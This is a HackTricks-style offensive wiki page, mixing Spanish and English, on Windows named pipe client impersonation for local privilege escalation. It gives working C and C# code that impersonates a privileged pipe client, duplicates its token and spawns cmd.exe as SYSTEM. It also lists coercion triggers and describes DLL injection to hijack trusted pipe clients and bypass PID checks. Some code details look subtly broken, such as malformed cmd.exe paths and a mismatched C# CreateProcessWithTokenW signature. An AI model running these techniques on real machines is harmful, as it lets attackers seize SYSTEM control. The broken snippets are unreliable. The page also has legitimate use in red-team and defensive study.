# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation es una primitiva de escalada de privilegios local que permite que un hilo servidor de named-pipe adopte el contexto de seguridad de un cliente que se conecta a él. En la práctica, un atacante que puede ejecutar código con SeImpersonatePrivilege puede forzar a un cliente privilegiado (p. ej., un servicio SYSTEM) a conectarse a una pipe controlada por el atacante, llamar a ImpersonateNamedPipeClient, duplicar el token resultante a un token primario y crear un proceso como el cliente (a menudo NT AUTHORITY\SYSTEM).

Esta página se centra en la técnica central. Para cadenas de explotación end-to-end que forcen a SYSTEM a conectarse a tu pipe, consulta las páginas de la familia Potato referenciadas más abajo.

## TL;DR
- Create a named pipe: \\.\pipe\<random> y espera una conexión.
- Haz que un componente privilegiado se conecte a ella (spooler/DCOM/EFSRPC/etc.).
- Lee al menos un mensaje de la pipe, luego llama a ImpersonateNamedPipeClient.
- Abre el token de impersonación del hilo actual, DuplicateTokenEx(TokenPrimary) y usa CreateProcessWithTokenW/CreateProcessAsUser para obtener un proceso SYSTEM.

## Requisitos y APIs clave
- Privilegios normalmente necesarios por el proceso/hilo que llama:
- SeImpersonatePrivilege para impersonar con éxito a un cliente que se conecta y para usar CreateProcessWithTokenW.
- Alternativamente, después de impersonar SYSTEM, puedes usar CreateProcessAsUser, que puede requerir SeAssignPrimaryTokenPrivilege y SeIncreaseQuotaPrivilege (estos se satisfacen cuando estás impersonando SYSTEM).
- APIs principales utilizadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (debes leer al menos un mensaje antes de la impersonación)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Nivel de impersonación: para realizar acciones útiles localmente, el cliente debe permitir SecurityImpersonation (por defecto en muchos clientes RPC/named-pipe locales). Los clientes pueden reducir esto con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION al abrir la pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Si ImpersonateNamedPipeClient devuelve ERROR_CANNOT_IMPERSONATE (1368), asegúrate de leer del pipe primero y de que el cliente no haya restringido la impersonación al nivel Identification.
- Prefiere DuplicateTokenEx con SecurityImpersonation y TokenPrimary para crear un token primario adecuado para la creación de procesos.

## Ejemplo rápido en .NET
En .NET, NamedPipeServerStream puede impersonar mediante RunAsClient. Una vez que se impersona, duplica el token del hilo y crea un proceso.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Estas técnicas coaccionan servicios privilegiados para que se conecten a tu named pipe y puedas suplantarlos:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Consulta el uso detallado y la compatibilidad aquí:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si solo necesitas un ejemplo completo de cómo construir el pipe y suplantar para spawn SYSTEM desde un trigger de servicio, consulta:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services can still be hijacked by instrumenting the trusted client. Tools like [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) drop a helper DLL into the client, proxy its traffic, and let you tamper with privileged IPC before the SYSTEM service consumes it.

### Inline API hooking inside trusted processes
- Inject the helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) into any client.
- The DLL Detours `ReadFile`, `WriteFile`, etc., but only when `GetFileType` reports `FILE_TYPE_PIPE`, copies each buffer/metadata to a control pipe, lets you edit/drop/replay it, then resumes the original API.
- Turns the legitimate client into a Burp-style proxy: pause UTF-8/UTF-16/raw payloads, trigger error paths, replay sequences, or export JSON traces.

### Remote client mode to defeat PID-based validation
- Inject into an allow-listed client, then in the GUI choose the pipe plus that PID.
- The DLL issues `CreateFile`/`ConnectNamedPipe` inside the trusted process and relays the I/O back to you, so the server still observes the legitimate PID/image.
- Bypasses filters that rely on `GetNamedPipeClientProcessId` or signed-image checks.

### Fast enumeration and fuzzing
- `pipelist` enumerates `\\.\pipe\*`, shows ACLs/SIDs, and forwards entries to other modules for immediate probing.
- The pipe client/message composer connects to any name and builds UTF-8/UTF-16/raw-hex payloads; import captured blobs, mutate fields, and resend to hunt deserializers or unauthenticated command verbs.
- The helper DLL can host a loopback TCP listener so tooling/fuzzers can drive the pipe remotely via the Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Combine the TCP bridge with VM snapshot restores to crash-test fragile IPC parsers.

### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port I/O coverage is partial, so expect edge cases.
- Injection is noisy and unsigned, so treat it as a lab/exploit-dev helper rather than a stealth implant.

## Troubleshooting and gotchas
- Debes leer al menos un mensaje del pipe antes de llamar a ImpersonateNamedPipeClient; de lo contrario obtendrás ERROR_CANNOT_IMPERSONATE (1368).
- Si el cliente se conecta con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, el servidor no puede impersonate completamente; verifica el nivel de impersonation del token mediante GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requiere SeImpersonatePrivilege en el llamador. Si eso falla con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser después de que ya hayas impersonated SYSTEM.
- Asegúrate de que el security descriptor de tu pipe permita que el servicio objetivo se conecte si lo hardenas; por defecto, las pipes bajo \\.\pipe son accesibles según el DACL del servidor.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
